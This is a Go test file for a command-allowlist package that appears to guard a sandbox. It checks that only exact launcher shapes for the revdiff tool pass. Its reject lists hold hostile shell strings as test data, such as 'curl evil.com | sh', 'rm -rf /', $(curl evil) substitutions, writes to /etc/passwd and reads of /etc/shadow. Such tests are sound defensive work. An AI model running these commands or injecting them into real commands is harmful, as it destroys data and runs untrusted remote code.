package cmdpattern

import (
	"path/filepath"
	"testing"
)

func TestMatchAny(t *testing.T) {
	m := MatchAny()
	if !m(nil) {
		t.Error("MatchAny(nil) should be true")
	}
	if !m([]string{"a", "b"}) {
		t.Error("MatchAny(args) should be true")
	}
}

func TestMatchPrefix(t *testing.T) {
	m := MatchPrefix("--type=overlay")
	if !m([]string{"--type=overlay", "echo", "hi"}) {
		t.Error("expected match for prefix")
	}
	if m([]string{"echo", "hi"}) {
		t.Error("expected no match when prefix absent")
	}
	if m(nil) {
		t.Error("expected no match for empty args with non-empty prefix")
	}
}

func TestMatchShellExec_AcceptsRevdiffViaSh(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "revdiff a b"},
		{"-c", "exec revdiff a b"},
		{"-c", "  exec   revdiff --staged"},
	}
	for _, args := range cases {
		t.Run(args[1], func(t *testing.T) {
			if !m(args) {
				t.Errorf("expected match for %q", args)
			}
		})
	}
}

func TestMatchShellExec_RejectsOther(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "curl evil.com | sh"},
		{"-c", "echo revdiff"}, // text mentions revdiff but argv[0] is echo
		{"-c", "rm -rf /"},
		{"echo", "revdiff"}, // not -c form
		nil,
	}
	for _, args := range cases {
		t.Run("reject", func(t *testing.T) {
			if m(args) {
				t.Errorf("expected no match for %v", args)
			}
		})
	}
}

// TestMatchShellExec_RejectsShellMetacharacters covers the case where the first
// token legitimately matches the inner program but the rest of the script
// contains shell operators that would execute additional commands. Without
// shellMeta filtering, a MatchAny inner matcher silently accepts these.
func TestMatchShellExec_RejectsShellMetacharacters(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	bypasses := []string{
		"revdiff && rm -rf /",
		"revdiff; curl evil | sh",
		"revdiff | tee /etc/passwd",
		"revdiff || whoami",
		"revdiff `curl evil`",
		"revdiff $(curl evil)",
		"revdiff > /etc/passwd",
		"revdiff < /etc/shadow",
		"revdiff * ?",
		"revdiff \necho pwned",
		"revdiff \\`echo pwned\\`",
	}
	for _, script := range bypasses {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("bypass: matcher accepted %q", script)
			}
		})
	}
}

// TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape exercises the exact
// form revdiff's kitty launcher produces: single-quoted argv followed by
// "; touch '<sentinel-path>'".
func TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner)

	cases := []string{
		`'/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'`,
		`'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`,
		`'/home/user/.local/bin/revdiff' '--output=/tmp/out' 'HEAD~1'; touch '/home/user/.cache/devsandbox/tmp/revdiff-done-2'`,
	}
	for _, script := range cases {
		t.Run(script, func(t *testing.T) {
			if !m([]string{"-c", script}) {
				t.Errorf("expected accept for %q", script)
			}
		})
	}
}

func TestMatchShellExecSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner)

	rejects := []string{
		// No sentinel suffix at all.
		`'/bin/revdiff' '--staged'`,
		// Wrong tail program (not touch).
		`'/bin/revdiff'; rm '/etc/passwd'`,
		// Extra command injected before the sentinel.
		`'/bin/revdiff'; curl evil; touch '/tmp/revdiff-done-x'`,
		// Command injection inside a quoted arg via backslash-escape — rejected
		// because backslash is banned inside quotes.
		`'/bin/revdiff\nrm -rf /'; touch '/tmp/revdiff-done-x'`,
		// Unquoted args.
		`revdiff --staged; touch /tmp/revdiff-done-x`,
		// Double quotes (not accepted — wrong quote style).
		`"revdiff" "--staged"; touch "/tmp/revdiff-done-x"`,
		// Sentinel path contains ".."
		`'/bin/revdiff'; touch '/tmp/../etc/passwd'`,
		// Sentinel path has a space.
		`'/bin/revdiff'; touch '/tmp/revdiff done'`,
		// Sentinel path has shell meta.
		`'/bin/revdiff'; touch '/tmp/$(whoami)'`,
		// Two touches — extra shell work.
		`'/bin/revdiff'; touch '/tmp/a'; touch '/tmp/b'`,
		// Pipe in first half.
		`'/bin/revdiff' | 'curl'; touch '/tmp/x'`,
		// Inner program does not match.
		`'/bin/curl' 'evil.com'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape exercises
// the revdiff launcher shape introduced in v0.8.0: when EDITOR or VISUAL are
// set on the caller's shell, the launcher prepends `/usr/bin/env KEY=VAL ...`
// so the kitty-spawned overlay inherits the intended editor.
func TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	cases := []string{
		`'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`,
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`,
		`'env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-2'`,
		// env prefix with no KEY=VAL pairs is still accepted — the revdiff
		// launcher always uses `env` when ENV_PREFIX is non-empty, but a future
		// version could collapse to `env revdiff ...`. Accepting this costs
		// nothing and keeps the matcher robust.
		`'/usr/bin/env' 'revdiff' '--staged'; touch '/tmp/revdiff-done-3'`,
		// Actual launcher output (v0.8.0+): `/usr/bin/env` is left unquoted
		// while every subsequent token is single-quoted. Must match.
		`/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`,
		`/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-4'`,
		`/usr/bin/env 'revdiff' '--staged'; touch '/tmp/revdiff-done-5'`,
	}
	for _, script := range cases {
		t.Run(script, func(t *testing.T) {
			if !m([]string{"-c", script}) {
				t.Errorf("expected accept for %q", script)
			}
		})
	}
}

func TestMatchShellExecEnvSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	rejects := []string{
		// First token is not env.
		`'/bin/sh' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// env wrapping a non-revdiff program.
		`'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Only env + KEY=VAL, no inner program.
		`'/usr/bin/env' 'EDITOR=nvim'; touch '/tmp/revdiff-done-x'`,
		// Just env with nothing else.
		`'/usr/bin/env'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (lowercase).
		`'/usr/bin/env' 'editor=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (starts with digit).
		`'/usr/bin/env' '1FOO=bar' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// KEY=VAL with shell metacharacter in value (rejected by the
		// parseSingleQuotedArgv byte filter — backslash banned).
		`'/usr/bin/env' 'EDITOR=nvim\nevil' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Missing sentinel tail.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'`,
		// Extra command appended after sentinel.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/a'; curl evil`,
		// Sentinel has ".." segment.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/../etc/passwd'`,
		// env prefix followed by a wrapping sh (nested shell).
		`'/usr/bin/env' 'EDITOR=nvim' 'sh' '-c' 'revdiff'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: only the literal `/usr/bin/env ` prefix is
		// accepted. Bare `env` (PATH-relative) must be rejected so attackers
		// can't shadow `env` via $PATH.
		`env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: a non-env absolute path must be rejected.
		`/bin/curl 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: /usr/bin/env wrapping a non-revdiff inner program
		// must still be rejected.
		`/usr/bin/env 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: symlink-like path ending in /env must be rejected —
		// the prefix check is exact, not basename-matched.
		`/tmp/evil/env 'EDITOR=nvim' 'revdiff'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

func TestPatternMatchesArgv(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	if !p.MatchesArgv([]string{"revdiff", "a", "b"}) {
		t.Error("expected program-only match")
	}
	if !p.MatchesArgv([]string{"/usr/local/bin/revdiff", "a"}) {
		t.Error("expected path-resolves-to-basename match")
	}
	if p.MatchesArgv([]string{"revdiffx", "a"}) {
		t.Error("unrelated program should not match")
	}
	if p.MatchesArgv(nil) {
		t.Error("empty argv should not match")
	}
}

func TestCommandPatternResolvedBinPinsExactPath(t *testing.T) {
	const real = "/usr/local/bin/revdiff"

	p := CommandPattern{Program: "revdiff", ResolvedBin: real, ArgsMatcher: MatchAny()}

	tests := []struct {
		name string
		arg0 string
		want bool
	}{
		{"exact resolved path accepted", real, true},
		{"uncleaned form of the same path accepted", "/usr/local/bin/./revdiff", true},
		{"same basename elsewhere rejected", "/home/zekker/.cache/devsandbox/revdiff-ipc/abc/revdiff", false},
		{"same basename in tmp rejected", "/tmp/revdiff", false},
		{"bare name rejected (host PATH lookup could land anywhere)", "revdiff", false},
		{"different basename at allowed dir rejected", "/usr/local/bin/evil", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := p.MatchesArgv([]string{tt.arg0, "--output=/tmp/o"}); got != tt.want {
				t.Errorf("MatchesArgv(%q) = %v, want %v", tt.arg0, got, tt.want)
			}
		})
	}
}

func TestCommandPatternRejectBeatsEverything(t *testing.T) {
	const ipc = "/home/zekker/.cache/devsandbox/revdiff-ipc/abc"

	// Reject must win even when ResolvedBin names a path inside it, so a
	// misconfigured caller cannot re-open the hole.
	p := CommandPattern{
		Program:     "revdiff",
		ResolvedBin: ipc + "/revdiff",
		Reject:      []string{ipc},
		ArgsMatcher: MatchAny(),
	}
	if p.MatchesArgv([]string{ipc + "/revdiff"}) {
		t.Error("MatchesArgv accepted a program under a rejected prefix, want rejected")
	}
}

func TestCommandPatternRejectPrefixIsSegmentAware(t *testing.T) {
	p := CommandPattern{
		Program:     "revdiff",
		Reject:      []string{"/a/b"},
		ArgsMatcher: MatchAny(),
	}

	if p.MatchesArgv([]string{"/a/b/revdiff"}) {
		t.Error("program directly under rejected dir was accepted, want rejected")
	}
	if p.MatchesArgv([]string{"/a/b/nested/revdiff"}) {
		t.Error("program nested under rejected dir was accepted, want rejected")
	}
	// "/a/bc" only shares a string prefix with "/a/b"; it is a different tree.
	if !p.MatchesArgv([]string{"/a/bc/revdiff"}) {
		t.Error("program under sibling dir /a/bc was rejected, want accepted")
	}
}

// TestCommandPatternLegacyBasenameUnchanged pins the pre-existing behavior for
// patterns that set no ResolvedBin, so extracting this package does not
// silently change the meaning of any existing caller.
func TestCommandPatternLegacyBasenameUnchanged(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}

	for _, arg0 := range []string{"revdiff", "/usr/bin/revdiff", "/anywhere/at/all/revdiff"} {
		if !p.MatchesArgv([]string{arg0}) {
			t.Errorf("MatchesArgv(%q) = false, want true (legacy basename mode)", arg0)
		}
	}
	if p.MatchesArgv([]string{"/usr/bin/other"}) {
		t.Error("MatchesArgv(/usr/bin/other) = true, want false")
	}
}

func TestResolveProgram(t *testing.T) {
	// `go` is on PATH in any environment that can run this test.
	got, err := ResolveProgram("go")
	if err != nil {
		t.Fatalf("ResolveProgram(go) returned error: %v", err)
	}
	if !filepath.IsAbs(got) {
		t.Errorf("ResolveProgram(go) = %q, want an absolute path", got)
	}
	if filepath.Base(got) != "go" {
		t.Errorf("ResolveProgram(go) = %q, want basename %q", got, "go")
	}

	if _, err := ResolveProgram("definitely-not-a-real-binary-xyzzy"); err == nil {
		t.Error("ResolveProgram(nonexistent) returned nil error, want failure so the pattern denies rather than widens")
	}
}
